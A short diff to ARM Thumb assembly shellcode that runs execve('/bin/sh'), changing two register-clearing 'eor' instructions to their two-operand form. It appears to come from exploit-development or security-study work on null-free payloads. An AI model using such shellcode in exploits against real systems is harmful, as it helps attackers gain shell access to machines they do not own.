@@ -21,9 +21,9 @@ _start:
     
     .code 16
     // execve("/bin/sh", NULL, NULL);
-    eor    r2, r2, r2     // r2 = NULL    
+    eor    r2, r2         // r2 = NULL    
     push   {r0, r1, r2}   // save string + null bytes
     mov    r0, sp         // r0 = "/bin//sh", 0
-    eor    r1, r1, r1     // r1 = NULL
+    eor    r1, r1         // r1 = NULL
     mov    r7, #11        // r7 = execve
     svc    1
